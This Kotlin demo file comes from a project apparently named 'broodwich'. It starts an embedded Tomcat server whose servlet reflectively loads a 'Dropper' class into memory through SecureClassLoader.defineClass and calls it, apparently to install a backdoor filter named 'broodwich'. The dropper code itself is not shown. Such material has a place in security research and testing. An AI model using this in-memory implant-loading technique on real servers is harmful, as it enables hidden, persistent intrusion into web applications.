package party.itistimeto.broodwich.demos

import org.apache.catalina.startup.Tomcat
import java.io.File
import java.nio.ByteBuffer
import java.nio.file.Files
import java.nio.file.Paths
import java.security.CodeSource
import java.security.SecureClassLoader
import javax.servlet.http.HttpServlet
import javax.servlet.http.HttpServletRequest
import javax.servlet.http.HttpServletResponse

fun main(args: Array<String>) {
    val tomcat = Tomcat()
    val ctx = tomcat.addContext("", File(".").absolutePath)

    Tomcat.addServlet(ctx, "demo", object: HttpServlet() {
        override fun service(req: HttpServletRequest?, resp: HttpServletResponse?) {
            if(!req?.servletContext?.filterRegistrations?.containsKey("broodwich")!!) {
                val bytecode = Files.readAllBytes(Paths.get(javaClass.classLoader.getResource("party/itistimeto/broodwich/Dropper.class").path.trimStart('/')))
                val bb = ByteBuffer.wrap(bytecode)
                val sclClazz = SecureClassLoader::class.java
                val sclConstructor = sclClazz.getDeclaredConstructor()
                sclConstructor.isAccessible = true
                val scl = sclConstructor.newInstance() as SecureClassLoader
                val defineClass = sclClazz.getDeclaredMethod("defineClass", String::class.java, ByteBuffer::class.java, CodeSource::class.java)
                defineClass.isAccessible = true
                val bwClass = defineClass.invoke(scl, "party.itistimeto.broodwich.Dropper", bb, null) as Class<*>
                bwClass.getDeclaredMethod("taste", javax.servlet.http.HttpServlet::class.java/*, ByteArray::class.java*/).invoke(null, this/*, byteArrayOf(0)*/)
            }
        }
    })
    ctx.addServletMappingDecoded("/*", "demo")

    tomcat.setPort(8090)
    tomcat.connector // ?
    tomcat.start()
    tomcat.server.await()
}